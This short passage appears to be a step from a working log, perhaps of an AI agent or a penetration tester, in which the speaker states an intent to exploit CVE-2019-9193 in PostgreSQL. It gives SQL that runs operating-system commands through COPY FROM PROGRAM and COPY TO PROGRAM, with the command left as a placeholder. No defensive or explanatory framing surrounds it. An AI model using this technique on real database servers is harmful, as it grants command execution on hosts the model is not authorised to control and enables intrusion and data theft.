Now I need to exploit CVE-2019-9193. This CVE allows authenticated PostgreSQL users to execute system commands using `COPY TO PROGRAM` or `COPY FROM PROGRAM`.

The exploit:
```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'command';
SELECT * FROM cmd_exec;
```

Or simpler:
```sql
COPY (SELECT '') TO PROGRAM 'command';
```

